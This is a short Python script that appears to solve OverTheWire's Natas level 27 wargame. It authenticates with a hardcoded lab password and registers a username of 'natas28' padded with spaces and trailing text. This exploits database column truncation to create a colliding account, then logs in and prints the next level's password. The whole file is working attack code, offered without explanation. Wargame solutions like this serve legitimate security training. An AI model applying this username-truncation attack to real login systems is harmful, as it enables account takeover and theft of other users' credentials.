import requests
import sys
import string
import base64
import os

session = requests.Session()
session.auth = ("natas27", "PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3")

def execute(session):

    data = {
	"username": "natas28                                                                       garbage",
	"password": "password"
    }
    response = session.post(
	url="http://natas27.natas.labs.overthewire.org/index.php",
	data=data
    )
    data = {
	"username": "natas28",
	"password": "password"
    }

    response = session.post(
	url="http://natas27.natas.labs.overthewire.org/index.php",
	data=data
    )

    for line in response.text.split('\n'):
	    if 'password' in line:
	        print(line)


execute(session)

session.close()
sys.exit()